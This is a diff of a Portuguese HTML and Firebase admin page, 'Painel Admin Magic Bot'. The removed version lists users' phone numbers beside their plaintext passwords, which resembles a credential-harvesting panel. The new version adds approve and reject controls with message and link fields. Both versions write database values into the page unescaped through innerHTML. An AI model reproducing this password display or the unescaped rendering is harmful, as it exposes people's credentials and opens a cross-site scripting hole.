@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -9,54 +10,66 @@
 <style>
 
 body{
-    font-family:Arial,sans-serif;
-    background:#f2f2f2;
-    padding:20px;
+font-family:Arial,sans-serif;
+background:#f2f2f2;
+padding:20px;
 }
 
 h1{
-    text-align:center;
-}
-
-h3{
-    text-align:center;
-    color:#333;
-}
-
-button{
-    padding:10px 20px;
-    cursor:pointer;
-    margin-bottom:15px;
+text-align:center;
 }
 
 table{
-    width:100%;
-    background:white;
-    border-collapse:collapse;
+width:100%;
+background:white;
+border-collapse:collapse;
 }
 
 th,td{
-    border:1px solid #ccc;
-    padding:10px;
-    text-align:center;
+border:1px solid #ccc;
+padding:10px;
+text-align:center;
 }
 
 th{
-    background:#222;
-    color:white;
+background:#222;
+color:white;
+}
+
+button{
+padding:8px;
+margin:3px;
+cursor:pointer;
+}
+
+input{
+width:90%;
+padding:5px;
+}
+
+.aprovar{
+background:green;
+color:white;
+}
+
+.rejeitar{
+background:red;
+color:white;
 }
 
 </style>
 
 </head>
 
+
 <body>
+
 
 <h1>📊 Painel Admin Magic Bot</h1>
 
-<h3>Total de Registros: <span id="total">0</span></h3>
 
 <button onclick="sair()">Sair</button>
+
 
 <table>
 
@@ -66,19 +79,24 @@ th{
 
 <th>Número</th>
 
-<th>Senha</th>
+<th>Status</th>
 
-<th>Data e Hora</th>
+<th>Mensagem</th>
+
+<th>Link</th>
+
+<th>Ações</th>
 
 </tr>
 
 </thead>
 
-<tbody id="dados">
 
-</tbody>
+<tbody id="dados"></tbody>
+
 
 </table>
+
 
 
 <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
@@ -87,69 +105,156 @@ th{
 
 <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
 
+
 <script src="firebase.js"></script>
+
+
 
 <script>
 
-// Verificar login
 
 firebase.auth().onAuthStateChanged((user)=>{
 
-    if(!user){
+if(!user){
 
-        window.location.href="login.html";
-
-    }
-
-});
-
-const tabela=document.getElementById("dados");
-
-const total=document.getElementById("total");
-
-db.ref("usuarios").on("value",(snapshot)=>{
-
-    tabela.innerHTML="";
-
-    let contador=0;
-
-    snapshot.forEach((item)=>{
-
-        contador++;
-
-        const dados=item.val();
-
-        tabela.innerHTML +=`
-
-        <tr>
-
-        <td>${dados.numero}</td>
-
-        <td>${dados.senha}</td>
-
-        <td>${dados.dataHora || "-"}</td>
-
-        </tr>
-
-        `;
-
-    });
-
-    total.innerHTML=contador;
-
-});
-
-function sair(){
-
-    firebase.auth().signOut().then(()=>{
-
-        window.location.href="login.html";
-
-    });
+window.location.href="login.html";
 
 }
 
+});
+
+
+
+const tabela=document.getElementById("dados");
+
+
+
+db.ref("usuarios").on("value",(snapshot)=>{
+
+
+tabela.innerHTML="";
+
+
+snapshot.forEach((item)=>{
+
+
+const id=item.key;
+
+const dados=item.val();
+
+
+
+tabela.innerHTML += `
+
+<tr>
+
+<td>${dados.numero}</td>
+
+<td>${dados.status}</td>
+
+
+<td>
+
+<input id="msg-${id}" value="${dados.mensagem || ''}">
+
+</td>
+
+
+<td>
+
+<input id="link-${id}" value="${dados.link || ''}">
+
+</td>
+
+
+<td>
+
+
+<button class="aprovar" onclick="aprovar('${id}')">
+
+✅ Aprovar
+
+</button>
+
+
+<button class="rejeitar" onclick="rejeitar('${id}')">
+
+❌ Rejeitar
+
+</button>
+
+
+</td>
+
+</tr>
+
+
+`;
+
+});
+
+
+});
+
+
+
+
+function aprovar(id){
+
+
+const mensagem=document.getElementById("msg-"+id).value;
+
+const link=document.getElementById("link-"+id).value;
+
+
+
+db.ref("usuarios/"+id).update({
+
+status:"aprovado",
+
+mensagem:mensagem,
+
+link:link
+
+});
+
+
+}
+
+
+
+function rejeitar(id){
+
+
+const mensagem=document.getElementById("msg-"+id).value;
+
+
+db.ref("usuarios/"+id).update({
+
+status:"rejeitado",
+
+mensagem:mensagem
+
+});
+
+
+}
+
+
+
+function sair(){
+
+firebase.auth().signOut().then(()=>{
+
+window.location.href="login.html";
+
+});
+
+}
+
+
 </script>
+
 
 </body>
 </html>
